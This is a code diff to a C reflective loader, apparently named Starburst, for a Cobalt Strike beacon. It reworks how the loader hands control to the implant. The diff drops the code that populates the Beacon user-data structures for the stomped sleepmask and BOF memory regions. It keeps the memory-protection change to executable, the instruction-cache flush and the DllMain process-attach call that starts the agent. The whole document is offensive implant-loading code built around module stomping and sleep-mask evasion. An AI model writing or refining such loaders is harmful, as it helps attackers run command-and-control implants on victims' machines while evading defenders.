@@ -49,8 +49,6 @@ FUNC VOID Main(
     SIZE_T                  szProtect           = { 0 };
     ULONG                   oldProtect          = { 0 };
     UDRL_USER_DATA          udrlData            = { 0 };
-    USER_DATA               userData            = { 0 };
-    ALLOCATED_MEMORY        allocatedMemory     = { 0 };
 
     if (!ResolveApis())
         return;
@@ -135,44 +133,9 @@ FUNC VOID Main(
     API( NtProtectVirtualMemory )(NtCurrentProcess(), &pProtect, &szProtect, PAGE_EXECUTE_READ, &oldProtect);
 
     //
-    // ── Populate CS USER_DATA (Beacon User Data) ──
-    //
-    // The agent's internal sleepmask/BOF loading reads USER_DATA + ALLOCATED_MEMORY
-    // (from beacon.h) to learn where those regions live. This is passed via
-    // DLL_BEACON_USER_DATA - the agent copies it internally.
-    //
-
-    userData.version = STARBURST_VERSION;
-
-    MmCopy(userData.custom, &cData, sizeof(PVOID));
-
-    userData.allocatedMemory = &allocatedMemory;
-
-    // Sleepmask region
-    allocatedMemory.AllocatedMemoryRegions[0].Purpose = PURPOSE_SLEEPMASK_MEMORY;
-    allocatedMemory.AllocatedMemoryRegions[0].AllocationBase = cData->pStompSleepmask;
-    allocatedMemory.AllocatedMemoryRegions[0].RegionSize = SZ_SLEEPMASK;
-    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].Label = LABEL_BUFFER;
-    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].BaseAddress = cData->pStompSleepmask;
-    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].VirtualSize = SZ_SLEEPMASK;
-    allocatedMemory.AllocatedMemoryRegions[0].Sections[0].CurrentProtect = PAGE_READWRITE;
-
-    // BOF region
-    allocatedMemory.AllocatedMemoryRegions[1].Purpose = PURPOSE_BOF_MEMORY;
-    allocatedMemory.AllocatedMemoryRegions[1].AllocationBase = cData->pStompBof;
-    allocatedMemory.AllocatedMemoryRegions[1].RegionSize = SZ_BOF;
-    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].Label = LABEL_BUFFER;
-    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].BaseAddress = cData->pStompBof;
-    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].VirtualSize = SZ_BOF;
-    allocatedMemory.AllocatedMemoryRegions[1].Sections[0].CurrentProtect = PAGE_READWRITE;
-
-    // Send BUD to agent - agent copies this internally
-    API( DllMain )(0, DLL_BEACON_USER_DATA, &userData);
-
-    //
     // ── Populate UDRL_USER_DATA ──
     //
-    // Starburst's own bridge struct for the sleep mask. Passed as lpvReserved
+    // Starburst bridge struct for the sleep mask. Passed as lpvReserved
     // in DLL_PROCESS_ATTACH so the sleep mask can access granular region info.
     //
 
@@ -236,10 +199,6 @@ FUNC VOID Main(
 
     API( NtFlushInstructionCache )((HANDLE)-1, NULL, 0);
 
-    // DLL_PROCESS_ATTACH - agent initializes, receives UDRL_USER_DATA as lpvReserved
-    API( DllMain )(cData->pStompBeacon, DLL_PROCESS_ATTACH, &udrlData);
-
-    // DLL_BEACON_START - agent begins operation
     PRINTB("Calling agent entry!");
-    API( DllMain )(StRipStart(), DLL_BEACON_START, NULL);
+    API( DllMain )(cData->pStompBeacon, DLL_PROCESS_ATTACH, &udrlData);
 }
